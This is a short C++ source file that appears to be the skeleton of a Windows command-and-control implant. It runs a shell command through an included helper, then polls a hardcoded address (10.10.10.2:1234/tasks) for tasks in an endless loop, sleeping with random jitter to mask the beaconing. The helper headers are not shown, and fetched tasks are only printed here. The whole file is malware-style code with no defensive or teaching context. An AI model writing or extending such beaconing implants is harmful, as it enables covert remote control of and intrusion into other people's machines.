#include <iostream>
#include <string>
#include <windows.h>
#include <cstdlib>
#include <ctime>
#include "shell.h"
#include "network_operations.h"


int main() {
    const std::string cmd = "dir";
    std::string output = shell(cmd);

    std::cout << "Output:" << output << "\n";

    std::srand(std::time(nullptr));

    while (true) {
        std::string ip = {"10.10.10.2"};
        std::string uri = {"/tasks"};
        unsigned int port = 1234;
        std::string response{get(ip, port, uri)};

        std::cout << response << "\n";
        int jitter = std::rand();
        Sleep(5000 + jitter);
    }
}
